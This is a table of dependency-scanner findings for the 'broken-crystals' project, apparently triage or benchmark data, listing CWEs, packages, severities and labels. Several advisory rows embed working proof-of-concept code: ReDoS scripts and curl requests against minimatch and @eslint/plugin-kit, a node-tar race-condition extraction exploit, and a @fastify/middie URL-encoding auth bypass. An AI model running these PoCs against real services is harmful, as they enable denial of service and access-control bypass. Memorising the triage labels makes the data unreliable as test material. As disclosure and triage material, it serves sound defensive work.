GRP-broken-crystals-CWE-1321-158,trivy,broken-crystals,CWE-1321,medium,js-yaml@4.1.0,js-yaml: js-yaml prototype pollution in merge,TP,medium,yes,1
GRP-broken-crystals-CWE-1321-159,trivy,broken-crystals,CWE-1321,medium,lodash@4.17.21,lodash: prototype pollution in _.unset and _.omit functions,TP,medium,yes,1
GRP-broken-crystals-CWE-1321-160,trivy,broken-crystals,CWE-1321,medium,tough-cookie@2.5.0,tough-cookie: prototype pollution in cookie memstore,TP,medium,yes,1
GRP-broken-crystals-CWE-1325-161,trivy,broken-crystals,CWE-1325,low,libssl-dev@1.1.1n-0+deb10u4,openssl: Unbounded memory growth with session handling in TLSv1.3,pending,low,no,1
GRP-broken-crystals-CWE-1325-162,trivy,broken-crystals,CWE-1325,low,libssl1.1@1.1.1n-0+deb10u4,openssl: Unbounded memory growth with session handling in TLSv1.3,pending,low,no,1
GRP-broken-crystals-CWE-1325-163,trivy,broken-crystals,CWE-1325,low,openssl@1.1.1n-0+deb10u4,openssl: Unbounded memory growth with session handling in TLSv1.3,pending,low,no,1
GRP-broken-crystals-CWE-1333-164,npm-audit,broken-crystals,CWE-1333,info,@babel/helpers,Babel has inefficient RegExp complexity in generated code with .replace when transpiling named capturing groups,pending,low,no,1
GRP-broken-crystals-CWE-1333-165,npm-audit,broken-crystals,CWE-1333,high,minimatch,minimatch has a ReDoS via repeated wildcards with non-matching literal in pattern,pending,low,no,1
GRP-broken-crystals-CWE-1333-166,dep-check,broken-crystals,CWE-1333,info,@babel/helpers:7.25.0,"### Impact When using Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), Babel will generate a polyfill for the `.replace` method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to `.replace`). Your generated code is vulnerable if _all_ the following conditions are true: - You use Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group) - You use the `.replace` method on a regular expression that contains named capturing groups - **Your code uses untrusted strings as the second argument of `.replace`** If you are using `@babel/preset-env` with the [`targets`](https://babeljs.io/docs/options#targets) option, the transform that injects the vulnerable code is automatically enabled if: - you use [_duplicated_ named capturing groups](https://github.com/tc39/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 - you use any [named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 You can verify what transforms `@babel/preset-env` is using by enabling the [`debug` option](https://babeljs.io/docs/babel-preset-env#debug). ### Patches This problem has been fixed in `@babel/helpers` and `@babel/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on `@babel/helpers`, and instead you depend on `@babel/core` (which itself depends on `@babel/helpers`). Upgrading to `@babel/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel/helpers` version. Please note that just updating your Babel dependencies is not enough: you will also need to re-compile your code. ### Workarounds If you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$<` if it's then not followed by `>` (possibly with other characters in between). ### References This vulnerability was reported and fixed in https://github.com/babel/babel/pull/17173.",pending,low,no,1
GRP-broken-crystals-CWE-1333-167,dep-check,broken-crystals,CWE-1333,low,@eslint/plugin-kit:0.2.2,"Crafting a very large and well crafted string can increase the CPU usage and crash the program. ## POC ```js const { ConfigCommentParser } = require(""@eslint/plugin-kit""); var str = """"; for (var i = 0; i < 1000000; i++) { str += "" ""; } str += ""A""; console.log(""start"") var parser = new ConfigCommentParser(); console.log(parser.parseStringConfig(str, """")); console.log(""end"") // run `npm i @eslint/plugin-kit` and `node attack.js` // then the program will stuck forever with high CPU usage ```",pending,low,no,1
GRP-broken-crystals-CWE-1333-168,dep-check,broken-crystals,CWE-1333,high,cross-spawn:7.0.3,Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.,pending,low,no,1
GRP-broken-crystals-CWE-1333-169,dep-check,broken-crystals,CWE-1333,high,minimatch:3.1.2,"### Summary Nested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally. --- ### Details The root cause is in `AST.toRegExpSource()` at [`src/ast.ts#L598`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/ast.ts#L598). For the `*` extglob type, the close token emitted is `)*` or `)?`, wrapping the recursive body in `(?:...)*`. When extglobs are nested, each level adds another `*` quantifier around the previous group: ```typescript : this.type === '*' && bodyDotAllowed ? `)?` : `)${this.type}` ``` This produces the following regexps: | Pattern | Generated regex | |----------------------|------------------------------------------| | `*(a\|b)` | `/^(?:a\|b)*$/` | | `*(*(a\|b))` | `/^(?:(?:a\|b)*)*$/` | | `*(*(*(a\|b)))` | `/^(?:(?:(?:a\|b)*)*)*$/` | | `*(*(*(*(a\|b))))` | `/^(?:(?:(?:(?:a\|b)*)*)*)*$/` | These are textbook nested-quantifier patterns. Against an input of repeated `a` characters followed by a non-matching character `z`, V8's backtracking engine explores an exponential number of paths before returning `false`. The generated regex is stored on `this.set` and evaluated inside `matchOne()` at [`src/index.ts#L1010`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L1010) via `p.test(f)`. It is reached through the standard `minimatch()` call with no configuration. Measured times via `minimatch()`: | Pattern | Input | Time | |----------------------|--------------------|------------| | `*(*(a\|b))` | `a` x30 + `z` | ~68,000ms | | `*(*(*(a\|b)))` | `a` x20 + `z` | ~124,000ms | | `*(*(*(*(a\|b))))` | `a` x25 + `z` | ~116,000ms | | `*(a\|a)` | `a` x25 + `z` | ~2,000ms | Depth inflection at fixed input `a` x16 + `z`: | Depth | Pattern | Time | |-------|----------------------|--------------| | 1 | `*(a\|b)` | 0ms | | 2 | `*(*(a\|b))` | 4ms | | 3 | `*(*(*(a\|b)))` | 270ms | | 4 | `*(*(*(*(a\|b))))` | 115,000ms | Going from depth 2 to depth 3 with a 20-character input jumps from 66ms to 123,544ms -- a 1,867x increase from a single added nesting level. --- ### PoC Tested on minimatch@10.2.2, Node.js 20. **Step 1 -- verify the generated regexps and timing (standalone script)** Save as `poc4-validate.mjs` and run with `node poc4-validate.mjs`: ```javascript import { minimatch, Minimatch } from 'minimatch' function timed(fn) { const s = process.hrtime.bigint() let result, error try { result = fn() } catch(e) { error = e } const ms = Number(process.hrtime.bigint() - s) / 1e6 return { ms, result, error } } // Verify generated regexps for (let depth = 1; depth <= 4; depth++) { let pat = 'a|b' for (let i = 0; i < depth; i++) pat = `*(${pat})` const re = new Minimatch(pat, {}).set?.[0]?.[0]?.toString() console.log(`depth=${depth} ""${pat}"" -> ${re}`) } // depth=1 ""*(a|b)"" -> /^(?:a|b)*$/ // depth=2 ""*(*(a|b))"" -> /^(?:(?:a|b)*)*$/ // depth=3 ""*(*(*(a|b)))"" -> /^(?:(?:(?:a|b)*)*)*$/ // depth=4 ""*(*(*(*(a|b))))"" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/ // Safe-length timing (exponential growth confirmation without multi-minute hang) const cases = [ ['*(*(*(a|b)))', 15], // ~270ms ['*(*(*(a|b)))', 17], // ~800ms ['*(*(*(a|b)))', 19], // ~2400ms ['*(*(a|b))', 23], // ~260ms ['*(a|b)', 101], // <5ms (depth=1 control) ] for (const [pat, n] of cases) { const t = timed(() => minimatch('a'.repeat(n) + 'z', pat)) console.log(`""${pat}"" n=${n}: ${t.ms.toFixed(0)}ms result=${t.result}`) } // Confirm noext disables the vulnerability const t_noext = timed(() => minimatch('a'.repeat(18) + 'z', '*(*(*(a|b)))', { noext: true })) console.log(`noext=true: ${t_noext.ms.toFixed(0)}ms (should be ~0ms)`) // +() is equally affected const t_plus = timed(() => minimatch('a'.repeat(17) + 'z', '+(+(+(a|b)))')) console.log(`""+(+(+(a|b)))"" n=18: ${t_plus.ms.toFixed(0)}ms result=${t_plus.result}`) ``` Observed output: ``` depth=1 ""*(a|b)"" -> /^(?:a|b)*$/ depth=2 ""*(*(a|b))"" -> /^(?:(?:a|b)*)*$/ depth=3 ""*(*(*(a|b)))"" -> /^(?:(?:(?:a|b)*)*)*$/ depth=4 ""*(*(*(*(a|b))))"" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/ ""*(*(*(a|b)))"" n=15: 269ms result=false ""*(*(*(a|b)))"" n=17: 268ms result=false ""*(*(*(a|b)))"" n=19: 2408ms result=false ""*(*(a|b))"" n=23: 257ms result=false ""*(a|b)"" n=101: 0ms result=false noext=true: 0ms (should be ~0ms) ""+(+(+(a|b)))"" n=18: 6300ms result=false ``` **Step 2 -- HTTP server (event loop starvation proof)** Save as `poc4-server.mjs`: ```javascript import http from 'node:http' import { URL } from 'node:url' import { minimatch } from 'minimatch' const PORT = 3001 http.createServer((req, res) => { const url = new URL(req.url, `http://localhost:${PORT}`) const pattern = url.searchParams.get('pattern') ?? '' const path = url.searchParams.get('path') ?? '' const start = process.hrtime.bigint() const result = minimatch(path, pattern) const ms = Number(process.hrtime.bigint() - start) / 1e6 console.log(`[${new Date().toISOString()}] ${ms.toFixed(0)}ms pattern=""${pattern}"" path=""${path.slice(0,30)}""`) res.writeHead(200, { 'Content-Type': 'application/json' }) res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n') }).listen(PORT, () => console.log(`listening on ${PORT}`)) ``` Terminal 1 -- start the server: ``` node poc4-server.mjs ``` Terminal 2 -- fire the attack (depth=3, 19 a's + z) and return immediately: ``` curl ""http://localhost:3001/match?pattern=*%28*%28*%28a%7Cb%29%29%29&path=aaaaaaaaaaaaaaaaaaaz"" & ``` Terminal 3 -- send a benign request while the attack is in-flight: ``` curl -w ""\ntime_total: %{time_total}s\n"" ""http://localhost:3001/match?pattern=*%28a%7Cb%29&path=aaaz"" ``` **Observed output -- Terminal 2 (attack):** ``` {""result"":false,""ms"":""64149""} ``` **Observed output -- Terminal 3 (benign, concurrent):** ``` {""result"":false,""ms"":""0""} time_total: 63.022047s ``` **Terminal 1 (server log):** ``` [2026-02-20T09:41:17.624Z] pattern=""*(*(*(a|b)))"" path=""aaaaaaaaaaaaaaaaaaaz"" [2026-02-20T09:42:21.775Z] done in 64149ms result=false [2026-02-20T09:42:21.779Z] pattern=""*(a|b)"" path=""aaaz"" [2026-02-20T09:42:21.779Z] done in 0ms result=false ``` The server reports `""ms"":""0""` for the benign request -- the legitimate request itself requires no CPU time. The entire 63-second `time_total` is time spent waiting for the event loop to be released. The benign request was only dispatched after the attack completed, confirmed by the server log timestamps. Note: standalone script timing (~7s at n=19) is lower than server timing (64s) because the standalone script had warmed up V8's JIT through earlier sequential calls. A cold server hits the worst case. Both measurements confirm catastrophic backtracking -- the server result is the more realistic figure for production impact. --- ### Impact Any context where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments, multi-tenant platforms where users configure glob-based rules (file filters, ignore lists, include patterns), and CI/CD pipelines that evaluate user-submitted config files containing glob expressions. No evidence was found of production HTTP servers passing raw user input directly as the extglob pattern, so that framing is not claimed here. Depth 3 (`*(*(*(a|b)))`, 12 bytes) stalls the Node.js event loop for 7+ seconds with an 18-character input. Depth 2 (`*(*(a|b))`, 9 bytes) reaches 68 seconds with a 31-character input. Both the pattern and the input fit in a query string or JSON body without triggering the 64 KB length guard. `+()` extglobs share the same code path and produce equivalent worst-case behavior (6.3 seconds at depth=3 with an 18-character input, confirmed). **Mitigation available:** passing `{ noext: true }` to `minimatch()` disables extglob processing entirely and reduces the same input to 0ms. Applications that do not need extglob syntax should set this option when handling untrusted patterns.",pending,low,no,1
GRP-broken-crystals-CWE-1333-170,trivy,broken-crystals,CWE-1333,medium,ajv@6.12.6,ajv: ReDoS via $data reference,pending,low,no,1
GRP-broken-crystals-CWE-1333-171,trivy,broken-crystals,CWE-1333,medium,ajv@8.12.0,ajv: ReDoS via $data reference,pending,low,no,1
GRP-broken-crystals-CWE-1333-172,trivy,broken-crystals,CWE-1333,high,ansi-regex@3.0.0,nodejs-ansi-regex: Regular expression denial of service (ReDoS) matching ANSI escape codes,pending,low,no,1
GRP-broken-crystals-CWE-1333-173,trivy,broken-crystals,CWE-1333,high,ansi-regex@4.1.0,nodejs-ansi-regex: Regular expression denial of service (ReDoS) matching ANSI escape codes,pending,low,no,1
GRP-broken-crystals-CWE-1333-174,trivy,broken-crystals,CWE-1333,high,cross-spawn@5.1.0,cross-spawn: regular expression denial of service,pending,low,no,1
GRP-broken-crystals-CWE-1333-175,trivy,broken-crystals,CWE-1333,high,find-my-way@7.5.0,find-my-way: ReDoS vulnerability in multiparametric routes,pending,low,no,1
GRP-broken-crystals-CWE-1333-176,trivy,broken-crystals,CWE-1333,high,http-cache-semantics@3.8.1,http-cache-semantics: Regular Expression Denial of Service (ReDoS) vulnerability,pending,low,no,1
GRP-broken-crystals-CWE-1333-177,trivy,broken-crystals,CWE-1333,medium,micromatch@3.1.10,micromatch: vulnerable to Regular Expression Denial of Service,pending,low,no,1
GRP-broken-crystals-CWE-1333-178,trivy,broken-crystals,CWE-1333,medium,micromatch@4.0.5,micromatch: vulnerable to Regular Expression Denial of Service,pending,low,no,1
GRP-broken-crystals-CWE-1333-179,trivy,broken-crystals,CWE-1333,high,minimatch@3.1.2,minimatch: minimatch: Denial of Service via specially crafted glob patterns,pending,low,no,1
GRP-broken-crystals-CWE-1333-180,trivy,broken-crystals,CWE-1333,high,minimatch@5.1.6,minimatch: minimatch: Denial of Service via specially crafted glob patterns,pending,low,no,1
GRP-broken-crystals-CWE-1333-181,trivy,broken-crystals,CWE-1333,high,path-to-regexp@3.2.0,path-to-regexp: Backtracking regular expressions cause ReDoS,pending,low,no,1
GRP-broken-crystals-CWE-1333-182,trivy,broken-crystals,CWE-1333,high,path-to-regexp@6.2.1,path-to-regexp: Backtracking regular expressions cause ReDoS,pending,low,no,1
GRP-broken-crystals-CWE-1333-183,trivy,broken-crystals,CWE-1333,high,semver@5.7.1,nodejs-semver: Regular expression denial of service,pending,low,no,1
GRP-broken-crystals-CWE-1333-184,trivy,broken-crystals,CWE-1333,high,semver@6.3.0,nodejs-semver: Regular expression denial of service,pending,low,no,1
GRP-broken-crystals-CWE-1333-185,trivy,broken-crystals,CWE-1333,high,semver@7.3.8,nodejs-semver: Regular expression denial of service,pending,low,no,1
GRP-broken-crystals-CWE-1335-186,trivy,broken-crystals,CWE-1335,medium,linux-libc-dev@4.19.269-1,kernel: fbcon: shift-out-of-bounds in fbcon_set_font(),pending,low,no,1
GRP-broken-crystals-CWE-1342-187,trivy,broken-crystals,CWE-1342,medium,linux-libc-dev@4.19.269-1,hw: Intel: Gather Data Sampling (GDS) side channel vulnerability,pending,low,no,1
GRP-broken-crystals-CWE-150-188,trivy,broken-crystals,CWE-150,medium,bsdutils@1:2.33.1-0.1,util-linux: CVE-2024-28085: wall: escape sequence injection,pending,low,no,1
GRP-broken-crystals-CWE-150-189,trivy,broken-crystals,CWE-150,medium,fdisk@2.33.1-0.1,util-linux: CVE-2024-28085: wall: escape sequence injection,pending,low,no,1
GRP-broken-crystals-CWE-150-190,trivy,broken-crystals,CWE-150,medium,libblkid-dev@2.33.1-0.1,util-linux: CVE-2024-28085: wall: escape sequence injection,pending,low,no,1
GRP-broken-crystals-CWE-150-191,trivy,broken-crystals,CWE-150,medium,libblkid1@2.33.1-0.1,util-linux: CVE-2024-28085: wall: escape sequence injection,pending,low,no,1
GRP-broken-crystals-CWE-150-192,trivy,broken-crystals,CWE-150,medium,libfdisk1@2.33.1-0.1,util-linux: CVE-2024-28085: wall: escape sequence injection,pending,low,no,1
GRP-broken-crystals-CWE-150-193,trivy,broken-crystals,CWE-150,medium,libmount-dev@2.33.1-0.1,util-linux: CVE-2024-28085: wall: escape sequence injection,pending,low,no,1
GRP-broken-crystals-CWE-150-194,trivy,broken-crystals,CWE-150,medium,libmount1@2.33.1-0.1,util-linux: CVE-2024-28085: wall: escape sequence injection,pending,low,no,1
GRP-broken-crystals-CWE-150-195,trivy,broken-crystals,CWE-150,medium,libsmartcols1@2.33.1-0.1,util-linux: CVE-2024-28085: wall: escape sequence injection,pending,low,no,1
GRP-broken-crystals-CWE-150-196,trivy,broken-crystals,CWE-150,medium,libuuid1@2.33.1-0.1,util-linux: CVE-2024-28085: wall: escape sequence injection,pending,low,no,1
GRP-broken-crystals-CWE-150-197,trivy,broken-crystals,CWE-150,medium,mount@2.33.1-0.1,util-linux: CVE-2024-28085: wall: escape sequence injection,pending,low,no,1
GRP-broken-crystals-CWE-150-198,trivy,broken-crystals,CWE-150,medium,util-linux@2.33.1-0.1,util-linux: CVE-2024-28085: wall: escape sequence injection,pending,low,no,1
GRP-broken-crystals-CWE-150-199,trivy,broken-crystals,CWE-150,medium,uuid-dev@2.33.1-0.1,util-linux: CVE-2024-28085: wall: escape sequence injection,pending,low,no,1
GRP-broken-crystals-CWE-176-200,npm-audit,broken-crystals,CWE-176,high,tar,Race Condition in node-tar Path Reservations via Unicode Ligature Collisions on macOS APFS,pending,low,no,1
GRP-broken-crystals-CWE-176-201,dep-check,broken-crystals,CWE-176,high,tar:6.2.1,"**TITLE**: Race Condition in node-tar Path Reservations via Unicode Sharp-S (ß) Collisions on macOS APFS **AUTHOR**: Tomás Illuminati ### Details A race condition vulnerability exists in `node-tar` (v7.5.3) this is to an incomplete handling of Unicode path collisions in the `path-reservations` system. On case-insensitive or normalization-insensitive filesystems (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths (e.g., `ß` and `ss`), allowing them to be processed in parallel. This bypasses the library's internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions. The library uses a `PathReservations` system to ensure that metadata checks and file operations for the same path are serialized. This prevents race conditions where one entry might clobber another concurrently. ```typescript // node-tar/src/path-reservations.ts (Lines 53-62) reserve(paths: string[], fn: Handler) { paths = isWindows ? ['win32 parallelization disabled'] : paths.map(p => { return stripTrailingSlashes( join(normalizeUnicode(p)), // <- THE PROBLEM FOR MacOS FS ).toLowerCase() }) ``` In MacOS the ```join(normalizeUnicode(p)), ``` FS confuses ß with ss, but this code does not. For example: ``````bash bash-3.2$ printf ""CONTENT_SS\n"" > collision_test_ss bash-3.2$ ls collision_test_ss bash-3.2$ printf ""CONTENT_ESSZETT\n"" > collision_test_ß bash-3.2$ ls -la total 8 drwxr-xr-x 3 testuser staff 96 Jan 19 01:25 . drwxr-x---+ 82 testuser staff 2624 Jan 19 01:25 .. -rw-r--r-- 1 testuser staff 16 Jan 19 01:26 collision_test_ss bash-3.2$ `````` --- ### PoC ``````javascript const tar = require('tar'); const fs = require('fs'); const path = require('path'); const { PassThrough } = require('stream'); const exploitDir = path.resolve('race_exploit_dir'); if (fs.existsSync(exploitDir)) fs.rmSync(exploitDir, { recursive: true, force: true }); fs.mkdirSync(exploitDir); console.log('[*] Testing...'); console.log(`[*] Extraction target: ${exploitDir}`); // Construct stream const stream = new PassThrough(); const contentA = 'A'.repeat(1000); const contentB = 'B'.repeat(1000); // Key 1: ""f_ss"" const header1 = new tar.Header({ path: 'collision_ss', mode: 0o644, size: contentA.length, }); header1.encode(); // Key 2: ""f_ß"" const header2 = new tar.Header({ path: 'collision_ß', mode: 0o644, size: contentB.length, }); header2.encode(); // Write to stream stream.write(header1.block); stream.write(contentA); stream.write(Buffer.alloc(512 - (contentA.length % 512))); // Padding stream.write(header2.block); stream.write(contentB); stream.write(Buffer.alloc(512 - (contentB.length % 512))); // Padding // End stream.write(Buffer.alloc(1024)); stream.end(); // Extract const extract = new tar.Unpack({ cwd: exploitDir, // Ensure jobs is high enough to allow parallel processing if locks fail jobs: 8 }); stream.pipe(extract); extract.on('end', () => { console.log('[*] Extraction complete'); // Check what exists const files = fs.readdirSync(exploitDir); console.log('[*] Files in exploit dir:', files); files.forEach(f => { const p = path.join(exploitDir, f); const stat = fs.statSync(p); const content = fs.readFileSync(p, 'utf8'); console.log(`File: ${f}, Inode: ${stat.ino}, Content: ${content.substring(0, 10)}... (Length: ${content.length})`); }); if (files.length === 1 || (files.length === 2 && fs.statSync(path.join(exploitDir, files[0])).ino === fs.statSync(path.join(exploitDir, files[1])).ino)) { console.log('\[*] GOOD'); } else { console.log('[-] No collision'); } }); `````` --- ### Impact This is a **Race Condition** which enables **Arbitrary File Overwrite**. This vulnerability affects users and systems using **node-tar on macOS (APFS/HFS+)**. Because of using `NFD` Unicode normalization (in which `ß` and `ss` are different), conflicting paths do not have their order properly preserved under filesystems that ignore Unicode normalization (e.g., APFS (in which `ß` causes an inode collision with `ss`)). This enables an attacker to circumvent internal parallelization locks (`PathReservations`) using conflicting filenames within a malicious tar archive. --- ### Remediation Update `path-reservations.js` to use a normalization form that matches the target filesystem's behavior (e.g., `NFKD`), followed by first `toLocaleLowerCase('en')` and then `toLocaleUpperCase('en')`. Users who cannot upgrade promptly, and who are programmatically using `node-tar` to extract arbitrary tarball data should filter out all `SymbolicLink` entries (as npm does) to defend against arbitrary file writes via this file system entry name collision issue. ---",pending,low,no,1
GRP-broken-crystals-CWE-176-202,trivy,broken-crystals,CWE-176,high,tar@4.4.19,node-tar: tar: node-tar: Arbitrary file overwrite via Unicode path collision race condition,pending,low,no,1
GRP-broken-crystals-CWE-176-203,trivy,broken-crystals,CWE-176,high,tar@6.1.13,node-tar: tar: node-tar: Arbitrary file overwrite via Unicode path collision race condition,pending,low,no,1
GRP-broken-crystals-CWE-177-204,npm-audit,broken-crystals,CWE-177,high,@fastify/middie,Fastify Middie Middleware Path Bypass,pending,low,no,1
GRP-broken-crystals-CWE-177-205,dep-check,broken-crystals,CWE-177,high,@fastify/middie:8.3.3,"### Summary A security vulnerability exists in `@fastify/middie` where middleware registered with a specific path prefix can be bypassed using URL-encoded characters (e.g., `/%61dmin` instead of `/admin`). While the middleware engine fails to match the encoded path and skips execution, the underlying Fastify router correctly decodes the path and matches the route handler, allowing attackers to access protected endpoints without the middleware constraints. ### Details The vulnerability is caused by how `middie` matches requests against registered middleware paths. 1. **Regex Generation**: When [fastify.use('/admin', ...)](cci:1://file:///Users/harshjaiswal/work/research/nest/packages/platform-fastify/adapters/fastify-adapter.ts:733:2-741:3) is called, `middie` uses `path-to-regexp` to generate a regular expression for the path `/admin`. 2. **Request Matching**: For every request, `middie` executes this regular expression against `req.url` (or `req.originalUrl`). 3. **The Flaw**: `req.url` in Fastify contains the **raw, undecoded** path string. * The generated regex expects a decoded path (e.g., `/admin`). * If a request is sent to `/%61dmin`, the regex comparison fails (`/^\/admin/` does not match `/%61dmin`). * `middie` assumes the middleware does not apply and calls `next()`. 4. **Route Execution**: The request proceeds to Fastify's internal router, which performs URL decoding. It correctly identifies `/%61dmin` as `/admin` and executes the corresponding route handler. **Incriminated Source Code:** In the provided `middie` source: ```javascript // ... inside Holder function if (regexp) { const result = regexp.exec(url) // <--- 'url' is undecoded. if (result) { // ... executes middleware ... } else { that.done() // <--- Middleware skipped on mismatch } } ``` ### PoC **Step 1:** Run the following Fastify application (save as `app.js`): ```javascript const fastify = require('fastify')({ logger: true }); async function start() { // Register middie for Express-style middleware support await fastify.register(require('@fastify/middie')); // Middleware to block /admin route fastify.use('/admin', (req, res, next) => { res.statusCode = 403; res.end('Forbidden: Access to /admin is blocked'); }); // Sample routes fastify.get('/', async (request, reply) => { return { message: 'Welcome to the homepage' }; }); fastify.get('/admin', async (request, reply) => { return { message: 'Admin panel' }; }); // Start server try { await fastify.listen({ port: 3008 }); } catch (err) { fastify.log.error(err); process.exit(1); } } start(); ``` **Step 2:** Execute the attack. 1. **Normal Request (Blocked):** ```bash curl http://localhost:3008/admin # Output: Forbidden: Access to /admin is blocked ``` 2. **Bypass Request (Successful):** ```bash curl http://localhost:3008/%61dmin # Output: {""message"":""Admin panel""} ``` ### Impact * **Type:** Authentication/Authorization Bypass. * **Affected Components:** Applications using `@fastify/middie` to apply security controls (auth, rate limiting, IP filtering) to specific route prefixes. * **Severity:** High. Attackers can trivially bypass critical security middleware to access protected administrative or sensitive endpoints.",pending,low,no,1
GRP-broken-crystals-CWE-177-206,trivy,broken-crystals,CWE-177,high,@fastify/middie@8.1.0,Fastify Middie Middleware Path Bypass,pending,low,no,1
GRP-broken-crystals-CWE-178-207,trivy,broken-crystals,CWE-178,medium,curl@7.64.0-4+deb10u5,curl: information disclosure by exploiting a mixed case flaw,pending,low,no,1
GRP-broken-crystals-CWE-178-208,trivy,broken-crystals,CWE-178,medium,libcurl3-gnutls@7.64.0-4+deb10u5,curl: information disclosure by exploiting a mixed case flaw,pending,low,no,1
GRP-broken-crystals-CWE-178-209,trivy,broken-crystals,CWE-178,medium,libcurl4@7.64.0-4+deb10u5,curl: information disclosure by exploiting a mixed case flaw,pending,low,no,1
GRP-broken-crystals-CWE-178-210,trivy,broken-crystals,CWE-178,medium,libcurl4-openssl-dev@7.64.0-4+deb10u5,curl: information disclosure by exploiting a mixed case flaw,pending,low,no,1
GRP-broken-crystals-CWE-190-211,trivy,broken-crystals,CWE-190,medium,bsdutils@1:2.33.1-0.1,util-linux: integer overflow can lead to buffer overflow in get_sem_elements() in sys-utils/ipcutils.c,pending,low,no,1
GRP-broken-crystals-CWE-190-212,trivy,broken-crystals,CWE-190,medium,fdisk@2.33.1-0.1,util-linux: integer overflow can lead to buffer overflow in get_sem_elements() in sys-utils/ipcutils.c,pending,low,no,1
GRP-broken-crystals-CWE-190-213,trivy,broken-crystals,CWE-190,high,imagemagick@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Integer overflow in WriteTHUMBNAILImage of coders/thumbnail.c,pending,low,no,1
GRP-broken-crystals-CWE-190-214,trivy,broken-crystals,CWE-190,high,imagemagick-6-common@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Integer overflow in WriteTHUMBNAILImage of coders/thumbnail.c,pending,low,no,1
GRP-broken-crystals-CWE-190-215,trivy,broken-crystals,CWE-190,high,imagemagick-6.q16@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Integer overflow in WriteTHUMBNAILImage of coders/thumbnail.c,pending,low,no,1
GRP-broken-crystals-CWE-190-216,trivy,broken-crystals,CWE-190,medium,libblkid-dev@2.33.1-0.1,util-linux: integer overflow can lead to buffer overflow in get_sem_elements() in sys-utils/ipcutils.c,pending,low,no,1
GRP-broken-crystals-CWE-190-217,trivy,broken-crystals,CWE-190,medium,libblkid1@2.33.1-0.1,util-linux: integer overflow can lead to buffer overflow in get_sem_elements() in sys-utils/ipcutils.c,pending,low,no,1
GRP-broken-crystals-CWE-190-218,trivy,broken-crystals,CWE-190,medium,libfdisk1@2.33.1-0.1,util-linux: integer overflow can lead to buffer overflow in get_sem_elements() in sys-utils/ipcutils.c,pending,low,no,1
GRP-broken-crystals-CWE-190-219,trivy,broken-crystals,CWE-190,medium,libharfbuzz0b@2.3.1-1,harfbuzz: integer overflow in the component hb-ot-shape-fallback.cc,pending,low,no,1
GRP-broken-crystals-CWE-190-220,trivy,broken-crystals,CWE-190,high,libmagickcore-6-arch-config@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Integer overflow in WriteTHUMBNAILImage of coders/thumbnail.c,pending,low,no,1
GRP-broken-crystals-CWE-190-221,trivy,broken-crystals,CWE-190,high,libmagickcore-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Integer overflow in WriteTHUMBNAILImage of coders/thumbnail.c,pending,low,no,1
GRP-broken-crystals-CWE-190-222,trivy,broken-crystals,CWE-190,high,libmagickcore-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Integer overflow in WriteTHUMBNAILImage of coders/thumbnail.c,pending,low,no,1
GRP-broken-crystals-CWE-190-223,trivy,broken-crystals,CWE-190,high,libmagickcore-6.q16-6-extra@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Integer overflow in WriteTHUMBNAILImage of coders/thumbnail.c,pending,low,no,1
GRP-broken-crystals-CWE-190-224,trivy,broken-crystals,CWE-190,high,libmagickcore-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Integer overflow in WriteTHUMBNAILImage of coders/thumbnail.c,pending,low,no,1
GRP-broken-crystals-CWE-190-225,trivy,broken-crystals,CWE-190,high,libmagickcore-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Integer overflow in WriteTHUMBNAILImage of coders/thumbnail.c,pending,low,no,1
GRP-broken-crystals-CWE-190-226,trivy,broken-crystals,CWE-190,high,libmagickwand-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Integer overflow in WriteTHUMBNAILImage of coders/thumbnail.c,pending,low,no,1
GRP-broken-crystals-CWE-190-227,trivy,broken-crystals,CWE-190,high,libmagickwand-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Integer overflow in WriteTHUMBNAILImage of coders/thumbnail.c,pending,low,no,1
GRP-broken-crystals-CWE-190-228,trivy,broken-crystals,CWE-190,high,libmagickwand-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Integer overflow in WriteTHUMBNAILImage of coders/thumbnail.c,pending,low,no,1
